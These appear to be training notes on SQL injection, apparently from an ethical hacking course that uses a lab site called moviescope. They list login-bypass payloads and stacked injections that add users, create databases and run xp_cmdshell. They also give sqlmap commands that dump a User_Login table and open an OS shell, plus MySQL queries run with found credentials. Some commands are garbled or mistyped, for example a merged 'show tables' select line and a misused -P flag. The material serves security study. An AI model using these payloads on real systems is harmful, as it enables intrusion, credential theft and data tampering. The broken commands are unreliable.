# 15 - SQL Injection

## Module 15 - SQL Injection

## Manual Injection

* `‘ or 1=1 --`  for login bypass
* admin' --
* admin' #
* admin'/\*
* ' or 1=1--
* ' or 1=1#
* ' or 1=1/\*
* ') or '1'='1--
* ') or ('1'='1—
* `‘insert into login values ('john','apple123'); --` create own user in the database
* `‘create database mydatabase; --`  create database with name of mydatabase
* `‘exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --` execute ping on moviescope

## SQLMap

* Open the vulnerable website
* Copy the cookie from the inspect element
* Open the terminal and run SQLMap

### Basic Commands

* SQLMAP Extract DBS
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --dbs`
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --data="id=1&Submit=Submit"--dbs`
* Extract Tables
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope --tables`
* Extract Columns
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope -T User_Login --columns`
* Dump Data
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope -T User_Login --dump`
* OS Shell to execute commands
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" --os-shell`
* Login bypass
  * `blah' or 1=1 --`
* Insert data into DB from login
  * `blah';insert into login values ('john','apple123');`
* Create database from login
  * `blah';create database mydatabase;`
* Execute cmd from login
  * `blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --`

### **Perform an SQL Injection Attack Against MSSQL to Extract Databases using SQLMap**

* Login a website
* Inspect element
* Dev tools-\&gt;Console: document.cookie
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" –dbs**
  * **-u: Specify the target URL**
  * **--cookie: Specify the HTTP cookie header value**
  * **--dbs: Enumerate DBMS databases**
* Get a list of databases
* Select a database to extract its tables
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –tables**
  * **-D: Specify the DBMS database to enumerate**
  * **--tables: Enumerate DBMS database tables**
* Get a list of tables
* Select a column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –T User\_Login --dump**
* Get table data of this column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" --os-shell**
* Get the OS Shell
* TASKLIST

Then, if we've SQL username and psw, we can use them to login and query db.

```bash
mysql -U qdpmadmin -h 192.168.1.8 -P passwod
show databases;
use qdpm;
show tables' select * from users;
show dtabases;
use staff;
show tables;
select * from login;
select * from user;
```

### Additional Resources

{% embed url="https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7" %}

[https://www.youtube.com/watch?v=IR1JsaSQLMc](https://www.youtube.com/watch?v=IR1JsaSQLMc)
